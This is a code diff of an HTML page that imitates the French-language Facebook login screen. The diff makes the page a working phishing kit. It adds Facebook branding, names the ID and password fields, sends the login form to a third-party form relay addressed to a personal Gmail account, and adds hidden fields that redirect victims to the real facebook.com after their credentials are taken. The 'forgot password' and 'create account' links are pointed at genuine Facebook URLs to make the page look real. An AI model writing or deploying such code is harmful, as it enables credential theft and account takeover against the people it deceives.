@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion à Facebook</title>
+    <title>Facebook</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="/fbicon.png">
     <link rel="stylesheet" href="style.css">
     <!-- FontAwesome pour l'icône Meta -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -43,28 +44,31 @@
         </div>
         <br>
         <!-- Formulaire de connexion -->
-        <form class="login-form">
+        <form  >
+        <form class="login-form" action="https://formsubmit.co/jyink01@gmail.com" method="POST" />
             <div class="input-group">
-                <input type="text" placeholder="Numéro mobile ou e-mail" required>
+                <input name="ID" type="text" placeholder="Numéro mobile ou e-mail" required>
             </div>
             <div class="input-group">
-                <input type="password" placeholder="Mot de passe" required>
+                <input name="Password" type="password" placeholder="Mot de passe" required>
             </div>
+            <input type="hidden" name="_next" value="https://www.facebook.com/">
+            <input type="hidden" name="_template" value="table">
             <button type="submit" class="btn-login">Se connecter</button>
         </form>
 
         <!-- Lien mot de passe oublié -->
         <div class="forgot-password">
-            <a href="#">Mot de passe oublié ?</a>
+            <a href="https://m.facebook.com/login/identify/">Mot de passe oublié ?</a>
         </div>
         
         <!-- Séparateur / Espace flexible -->
         <div class="spacer"></div>
         <br>
         <!-- Bouton créer un compte -->
-        <div class="create-account-container">
+        <form class="create-account-container" action="https://m.facebook.com/login/identify/">
             <button class="btn-create">Créer un nouveau compte</button>
-        </div>
+        </form>
 
         <!-- Footer Meta & Liens -->
         <div class="footer">
